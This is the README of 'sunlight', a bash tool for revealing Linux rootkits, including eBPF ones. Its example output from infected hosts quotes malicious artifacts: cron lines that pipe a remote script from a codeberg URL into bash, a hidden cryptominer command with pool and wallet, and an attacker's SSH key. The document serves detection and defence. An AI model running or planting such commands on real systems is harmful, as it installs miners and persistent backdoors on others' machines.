# sunlight

[![Latest Release](https://img.shields.io/github/v/release/tstromberg/sunlight?include_prereleases)](https://github.com/tstromberg/sunlight/releases/latest)
[![stable](https://badges.github.io/stability-badges/dist/stable.svg)](https://github.com/badges/stability-badges)

sunlight is a tool to reveal Linux rootkits (including eBPF) and other malware. It's written in bash, so it's easy to understand or take apart.

![example](images/logo.png?raw=true "logo")

## Requirements

The following are required:

* Linux (some checks work on other UNIX platforms)
* bash

The following are optional but recommended:

* `osquery`, `curl`, `unzip` - comprehensive process analysis
* `bpftool`, `jq` - eBPF analysis

## Usage

To run all of the scripts:

```shell
sudo ./sunlight.sh
```

To run a single script:

```shell
./mystery-char-device.sh
```

## Example output (Qubitstrike)

On a host infected with Qubitstrike (which in turn installs Diamorphine), sunlight shows the following output:

```log
-- [ hidden-files.sh ] ---------------------------------------------------------
   793453      4 drwxr-xr-x   2 root     root         4096 Oct 20 02:06 /usr/share/.28810
   762662      4 drwxr-xr-x   2 root     root         4096 Oct 23 15:23 /usr/share/.LQvKibDTq4

-- [ hidden-pids.sh ] ----------------------------------------------------------
- hidden python-dev[22076] is running /usr/share/.LQvKibDTq4/python-dev: /usr/share/.LQvKibDTq4/python-dev -B -o pool.hashvault.pro:80 -u 49qQh9VMzdJTP1XA2yPDSx1QbYkDFupydE5AJAA3jQKTh3xUYVyutg28k2PtZGx8z3P2SS7VWKMQUb9Q4WjZ3jdmHPjoJRo -p 136.54.68.146 --donate-level 1 --tls --tls-fingerprint=420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 --max-cpu-usage 90 

-- [ kernel-taint.sh ] ---------------------------------------------------------
kernel taint value: 12288
* matches bit 12: externally-built (out-of-tree) module was loaded
* matches bit 13: unsigned module was loaded

dmesg:
[ 1429.084807] diamorphine: loading out-of-tree module taints kernel.
[ 1429.086163] diamorphine: module verification failed: signature and/or required key missing - tainting kernel

-- [ root-ssh-authorized-keys.sh ] ---------------------------------------------
root ssh keys found:
--------------------
  File: /root/.ssh/authorized_keys
  Size: 563        Blocks: 8          IO Block: 4096   regular file
Device: 252,1 Inode: 74748       Links: 1
Access: (0600/-rw-------)  Uid: (    0/    root)   Gid: (    0/    root)
Access: 2023-10-23 15:16:53.720318244 +0000
Modify: 2023-10-23 14:50:47.836000000 +0000
Change: 2023-10-23 15:16:53.708318146 +0000
 Birth: 2023-10-18 18:19:24.854873239 +0000

ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDV+S/3d5qwXg1yvfOm3ZTHqyE2F0zfQv1g12Wb7H4N5EnP1m8WvBOQKJ2htWqcDg2dpweE7htcRsHDxlkv2u+MC0g1b8Z/HawzqY2Z5FH4LtnlYq1QZcYbYIPzWCxifNbHPQGexpT0v/e6z27NiJa6XfE0DMpuX7lY9CVUrBWylcINYnbGhgSDtHnvSspSi4Qu7YuTnee3piyIZhN9m+tDgtz+zgHNVx1j0QpiHibhvfrZQB+tgXWTHqUazwYKR9td68twJ/K1bSY+XoI5F0hzEPTJWoCl3L+CKqA7gC3F9eDs5Kb11RgvGqieSEiWb2z2UHtW9KnTKTRNMdUNA619/5/HAsAcsxynJKYO7V/ifZ+ONFUMtm5oy1UH+49ha//UPWUA6T6vaeApzyAZKuMEmFGcNR3GZ6e8rDL0/miNTk6eq3JiQFR/hbHpn8h5Zq9NOtCoUU7lOvTGAzXBlfD5LIlzBnMA3EpigTvLeuHWQTqNPEhjYNy/YoPTgBAaUJE= root@kali
failed with 1

-- [ rootkit-signal-handler.sh ] -----------------------------------------------
NOTE: root-escalation detection requires a non-root user
- SIGNAL 31 made /proc/51645 (this process) invisible!
- SIGNAL 63 caused /proc/modules to change:
--- /tmp/tmp.Kl6Zm2Jk8l 2023-10-23 15:45:26.596006729 +0000
+++ /tmp/tmp.XCSOBYg4Gu 2023-10-23 15:45:26.780007070 +0000
@@ -10,6 +10,7 @@
 bridge
 btrfs
 ccp
+diamorphine
 dm_multipath
 drm
 drm_kms_helper
- SIGNAL 31 made /proc/51645 (this process) visible again!
- SIGNAL 63 caused /proc/modules to change:
--- /tmp/tmp.A6hTPpB1Vh 2023-10-23 15:45:53.924059225 +0000
+++ /tmp/tmp.9PeU5G9c6v 2023-10-23 15:45:54.104059583 +0000
@@ -10,7 +10,6 @@
 bridge
 btrfs
 ccp
-diamorphine
 dm_multipath
 drm
 drm_kms_helper

-- [ suspicious-cron.sh ] ------------------------------------------------------
no crontab for root
/etc/cron.d/netns:*/1 * * * * root /usr/share/.28810/kthreadd
/etc/cron.d/apache2.2:@daily root zget -q -O - https://codeberg.org/m4rt1/sh/raw/branch/main/mi.sh | bash
/etc/cron.d/apache2:@reboot root /usr/share/.LQvKibDTq4/python-dev -c /usr/share/.LQvKibDTq4/config.json
/etc/cron.d/netns2:0 0 */2 * * * root curl https://codeberg.org/m4rt1/sh/raw/branch/main/mi.sh | bash
/etc/crontab:0 * * * * wget -O- https://codeberg.org/m4rt1/sh/raw/branch/main/mi.sh | bash > /dev/null 2>&1
/etc/crontab:0 0 */3 * * * zget -q -O - https://codeberg.org/m4rt1/sh/raw/branch/main/mi.sh | bash > /dev/null 2>&1
failed with 1
```

## Example output (reveng_rtkit)

```log
-- [ kernel-taint.sh ] ---------------------------------------------------------
kernel taint value: 12288
* matches bit 12: externally-built (out-of-tree) module was loaded
* matches bit 13: unsigned module was loaded

dmesg:
[  368.765518] reveng_rtkit: loading out-of-tree module taints kernel.
[  368.777600] reveng_rtkit: module verification failed: signature and/or required key missing - tainting kernel

-- [ mystery-char-devices.sh ] -------------------------------------------------
low dynamic major device etx_device[247]
* crw------- 1 root root 247, 0 Mar  3 19:48 /dev/etx_device
* /proc/devices: 247 etx_Dev
```

## Example output (TripleCross, an eBPF rootkit)

```log
-- [ unexpected-ebpf-hooks.sh ] ------------------------------------------------
* Found interface with network traffic-control filtering enabled (tc qdisc):
qdisc clsact ffff: dev eth0 parent ffff:fff1 

* Found unexpected eBPF filesystem entry:
/sys/fs/bpf/backdoor_phantom_shell

* Unexpected eBPF map found:
{
  "id": 9,
  "type": "hash",
  "name": "backdoor_phanto",
  "flags": 0,
  "bytes_key": 8,
  "bytes_value": 76,
  "max_entries": 1,
  "bytes_memlock": 4096,
  "frozen": 0,
  "btf_id": 92
}
```
